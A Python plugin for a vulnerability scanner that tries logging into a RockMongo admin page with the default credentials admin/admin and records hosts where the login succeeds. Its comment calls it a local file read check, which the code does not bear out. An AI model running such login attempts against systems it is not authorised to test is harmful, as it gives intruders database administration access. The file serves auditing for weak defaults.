import requests

from celery_app.utils.utils import insert_vuln_db
from celery_app.config.config import web_port_short

#rockmongo 本地文件读取
plugin_id=48
default_port_list=web_port_short


def check(host, port=80):
    scheme = 'https' if '443' in str(port) else 'http'
    target = '{}://{}:{}'.format(scheme, host, port)
    uris = ['/index.php?action=login.index']
    hits = ['server.createDatabase']
    data = "more=0&host=0&username=admin&password=admin&db=&lang=zh_cn&expire=3"
    headers = {}

    headers['Content-Type'] = 'application/x-www-form-urlencoded'

    try:
        targets = ['{}{}'.format(target, uri) for uri in uris]
        requests.packages.urllib3.disable_warnings()
        with requests.Session() as session:
            for target in targets:
                response = session.post(target, headers=headers, data=data, timeout=7, verify=False)
                for hit in hits:
                    if hit in response.text:
                        output = response.text
                        insert_vuln_db(host, target, output, plugin_id)
                        return True, host, target, output
    except Exception as error:
        return False
    return False

